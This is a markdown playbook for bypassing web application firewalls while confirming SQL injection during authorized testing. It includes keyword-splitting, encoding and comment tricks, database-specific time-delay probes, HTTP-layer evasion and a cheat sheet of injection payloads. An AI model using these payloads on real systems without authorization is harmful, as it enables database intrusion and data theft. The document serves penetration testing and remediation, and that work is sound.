---
Vulnerability: SQLi
Category: Heuristic
---
# WAF Evasion Playbook (for SQLi Testing)

> **Scope:** Practical, minimally invasive **bypass patterns** for confirming SQL injection when generic WAF/IDS/IPS filters block straightforward probes. **Use only on authorized targets.** Prefer the least aggressive technique that proves the issue.

---

## 1) Safety & Approach
- Start with **benign** toggles (boolean/time) before trying heavy obfuscation.
- Keep a **lab notebook**: record payload → response (status/length/latency) and the mutation that made a difference.
- Throttle requests and cap attempts; avoid noisy CPU-heavy primitives (e.g., huge `BENCHMARK` counts).
- If a control path exists (e.g., a test/staging header), request a **temporary WAF allowlist** instead of escalating evasion.

---

## 2) Canonicalization Recon (what the server really sees)
1. Send echo-friendly inputs (e.g., to a search/list endpoint).
2. Vary encodings and whitespace; examine **server echo** and **response shape** to infer normalization rules.
3. Derive a **canonical form**: what ends up at the parser after URL-decoding, case folding, and comment stripping.

Checklist: Does the stack **lowercase** input? Collapse multiple spaces? Decode `%2f` to `/`? Strip `/*...*/`? Require a space after `--`? 

---

## 3) General Evasion Patterns
### 3.1 Case toggling & keyword breaking
- Mixed-case tokens defeat case-sensitive signatures:
```
SeLeCt, UnIoN, WaItFoR, pG_sLeEp
```
- Split keywords with noise that SQL ignores:
```
UNI/**/ON SEL/**/ECT
U N I O N/**/SELECT
```

### 3.2 Whitespace tricks
- Replace spaces with: `/**/`, tab `%09`, newline `%0a`, vertical tab `%0b`, form feed `%0c`, carriage return `%0d`.
- Parentheses can sometimes stand in for spaces around expressions: `AND(1=1)`.

### 3.3 Comment styles & quirks
- **MySQL**: requires a space after `--` (`-- `); supports `#`, `/* ... */`, and **versioned comments**:
```
/*!50000 SELECT user() */
```
- **MSSQL/PostgreSQL/Oracle**: `--` (line) and `/* ... */` (block). Oracle also accepts uppercase/lowercase freely.

### 3.4 No‑quotes payloads (survive quote filters)
- Use numeric contexts or build strings via char/hex:
```
-- MySQL
0x7139785A, CHAR(113,57,120,90)
-- MSSQL
CHAR(113)+CHAR(57)+CHAR(120)+CHAR(90)
-- PostgreSQL
CHR(113)||CHR(57)||CHR(120)||CHR(90)
-- Oracle
CHR(113)||CHR(57)||CHR(120)||CHR(90)
```

### 3.5 Operator & predicate variants
- Booleans: `1=1`, `1<2`, `2 BETWEEN 1 AND 3`, `COALESCE(1,0)=1`.
- Conditionals:
```
-- MySQL: IF(cond,1,0)
-- MSSQL/PostgreSQL/Oracle: CASE WHEN cond THEN 1 ELSE 0 END
```

### 3.6 Encodings & double‑decoding
- URL-encode selective bytes (`%27` for `'`, `%20` for space); if WAF decodes once, try **double-encoding** (`%2527`).
- Mix encodings with case-breaking and comments for layered bypasses.

### 3.7 Trailing comment normalizations
- Stabilize trailing comment to neutralize the remainder of the query. Try:
```
-- -      --+      --%20      #      /* */
```

### 3.8 String concatenation alternatives
- When `'||'` or `+` is filtered, use function-based concat:
```
CONCAT(a,b), CONCAT_WS(':',a,b)   -- MySQL
CAST(a AS NVARCHAR(4000))+b       -- MSSQL
(a || b) or to_char(a)||b         -- PostgreSQL/Oracle
```

### 3.9 Length & token shaping
- Some WAFs flag large responses or specific lengths. Equalize TRUE/FALSE branches by appending inert text or balancing predicates so both branches render similar lengths.

---

## 4) DB‑Specific Bypasses
### 4.1 MySQL / MariaDB
- `/*!SELECT*/` executes depending on version: `UNI/*!00000*/ON SEL/*!00000*/ECT`.
- Hex comparisons coerce to strings in some contexts: `0x61646D696E='admin'`.
- Use `SLE/**/EP(3)`; remember `-- ` needs a trailing space.

### 4.2 Microsoft SQL Server
- Split tokens: `WaItFoR DEL/**/AY '0:0:3'`, `CON/**/VERT(INT, ...)`.
- Normalize to `NVARCHAR` to avoid type mismatch signatures: `CAST(expr AS NVARCHAR(4000))`.
- Prefer `CASE WHEN` over `IF` (T‑SQL doesn’t support `IF()` as an expression).

### 4.3 PostgreSQL
- Dollar‑quoting in blocks sidesteps quote escaping: `DO $$ BEGIN ... END $$;`.
- Function aliases: `pg_sleep_for('3 seconds')` vs `pg_sleep(3)`.
- Use `::text` casts to normalize types in UNION.

### 4.4 Oracle
- Alternative quoting: `q'[text with ' quotes]'`.
- PL/SQL blocks for stacked effects: `BEGIN dbms_lock.sleep(3); END;`.
- If `DBMS_LOCK` is blocked, use `dbms_pipe.receive_message('x',3)` for time probes.

---

## 5) HTTP‑layer Evasion (before SQL)
- **Content‑Type pivots**: try `application/json`, `text/plain`, or `multipart/form-data` instead of URL‑encoded forms.
- **Parameter shape**: arrays (`q[]=x`), nested JSON, or different param names that map to the same server field.
- **Parameter pollution**: duplicate keys (`id=1&id=2`) to influence parser selection (authorized testing only).
- **Header vectors**: some backends log or persist headers into SQL (e.g., `X-Forwarded-For`, `User-Agent`). Use cautiously.
- **Path vs query**: move input from query string to route param or body if the app allows.
- **Encoding differences**: `+` vs `%20`, UTF‑8 overlongs (modern stacks usually reject), mixed case.

**Goal:** Find an input path that reaches SQL **before** the WAF’s most strict rules, not to disrupt perimeter defenses in general.

---

## 6) Example Mutations (cheat sheet)
```
-- Keyword split
UNI/**/ON SEL/**/ECT 1,version(),3

-- No‑quotes marker
UNION ALL SELECT 1,CHAR(113,57,120,90),3

-- Time probe variants
AND SLE/**/EP(3)-- -
; WaItFoR DEL/**/AY '0:0:3';--
AND CASE WHEN current_database()='appdb' THEN pg_sleep(3) ELSE pg_sleep(0) END-- -

-- Trailing comment stabilizers
-- -   --+   --%0a   #   /* */
```

---

## 7) When to Stop
- Stop once you’ve **proven control** (boolean flip, short time delay, or single-value echo).
- Do **not** mass‑dump data or attempt privileged features (file I/O, OOB callbacks) unless explicitly in scope.
- Provide developers with a **minimal reproduction** and a mitigation plan (prepared statements + identifier allowlists).

---

## 8) Quick Reviewer Checklist
- [ ] Evasion kept minimal; lawful scope respected
- [ ] Server canonicalization understood (echo/length tests)
- [ ] Successful mutation recorded (what bypassed what)
- [ ] Proof type captured (boolean/time/union/error)
- [ ] Clear remediation provided (parameterization, least privilege)
